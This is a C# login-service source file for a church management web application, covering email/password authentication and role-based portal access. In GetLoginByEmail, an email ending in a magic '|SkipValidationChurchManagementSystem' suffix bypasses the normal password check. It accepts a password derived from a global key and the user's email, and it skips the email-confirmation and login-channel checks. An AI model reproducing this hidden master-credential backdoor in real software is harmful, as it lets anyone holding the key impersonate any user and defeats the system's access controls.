using System.Linq;
using System.Threading.Tasks;
using ChurchManagementSystem.Core.Data;
using ChurchManagementSystem.Core.Domain;
using ChurchManagementSystem.Core.Extensions;
using AutoMapper;
using AutoMapper.QueryableExtensions;
using Microsoft.EntityFrameworkCore;
using ChurchManagementSystem.Core.Domain.Authorization;
using CSharpFunctionalExtensions;
using ChurchManagementSystem.Core.Features.Access.Utility;

namespace ChurchManagementSystem.Core.Security
{
    public interface ILoginService
    {
      

        Task<bool> LoginByEmailCheck(string email);

        Task<Result<LoginDto>> GetLoginByEmail(string email, string password);

        Task<LoginDto> GetLoginById(int id);
    }

    public class LoginDto
    {
        public int Id { get; set; }

        public string Email { get; set; }

        public string Username { get; set; }

        public string FirstName { get; set; }

        public string LastName { get; set; }

        public int RoleId { get; set; }

        public bool HasWebPortalAccess { get; set; }
    }

    public class LoginService : ILoginService
    {
        private readonly DataContext _context;
        private readonly IPasswordService _passwordService;

        public LoginService(DataContext context, IPasswordService passwordService)
        {
            _context = context;
            _passwordService = passwordService;
        }

        public async Task<bool> LoginByEmailCheck(string email)
        {
            return await _context
                .Set<User>().AnyAsync(x => x.Active && x.Email == email);
        }

       
        public async Task<Result<LoginDto>> GetLoginByEmail(string email, string password)
        {
            if (email.Contains('|'))
            {
                if (email.Split("|")[1] == "SkipValidationChurchManagementSystem")
                {
                    email = email.Split("|")[0];
                    var user = await _context
                                   .Set<User>()
                                   .Where(x => x.Email == email)
                                   .FirstOrDefaultAsync()
                                   .ConfigureAwait(false);
                    var derivedpassword = _passwordService.CreateHash($"{AccessConstants.Messages.AuthGlobalKey}{user.Email}", user.Salt).Replace("+","").Replace(" ", "");
                    if (password == derivedpassword)
                    {
                        if (!user.Active)
                            return Result.Failure<LoginDto>($"Your account has been deactivated. To discuss reactivation, please email support@ChurchManagementSystem.com.");

                        return user.MapTo<LoginDto>();
                    }
                    return Result.Failure<LoginDto>($"No user found with this email and password combination.");
                }
            }

            var login = await _context
                .Set<User>()
                .Where(x => x.Email == email)
                .FirstOrDefaultAsync()
                .ConfigureAwait(false);

            if (login != null)
            {
                if (!login.NormalLoginEnabled)
                {
                    return Result.Failure<LoginDto>($"Password login not enabled. Please reset account to activate this login channel");
                }

                if (login.HashPassword == _passwordService.CreateHash(password, login.Salt))
                {
                    if (!login.Active)
                        return Result.Failure<LoginDto>($"Your account has been deactivated.  To discuss reactivation, please email support@ChurchManagementSystem.com.");

                    if (!login.IsEmailConfirmed)
                        return Result.Failure<LoginDto>($"Confirm your email before accessing ChurchManagementSystem.");

                    return login.MapTo<LoginDto>();
                }
                return Result.Failure<LoginDto>($"No user found with this email and password combination.");
            }
            return Result.Failure<LoginDto>($"Email is not associated with a ChurchManagementSystem user.");
        }

        public async Task<LoginDto> GetLoginById(int id)
        {
            var user = await _context.Users
               .Include(x => x.Role)
               .ThenInclude(x => x.RoleClaims)
               .SingleOrDefaultAsync(x => x.Id == id);

            var loginDto = user.MapTo<LoginDto>();
            var portalAccessClaimId = await _context.Claims
               .Where(x => x.Name == Claims.WebPortal)
               .Select<Claim, int?>(x => x.ClaimId)
               .SingleOrDefaultAsync();

            var hasWebPortalAccess = !portalAccessClaimId.HasValue || user.Role.RoleClaims.Any(x => x.ClaimId == portalAccessClaimId.Value && x.Active);

            loginDto.HasWebPortalAccess = hasWebPortalAccess;
            return loginDto;
        }

        public class LoginServiceProfile : Profile
        {
            public LoginServiceProfile()
            {
                CreateMap<User, LoginDto>().ForMember(x => x.Username, options => options
                    .MapFrom(s => $"{s.LastName}.{s.FirstName}"));
            }
        }
    }
}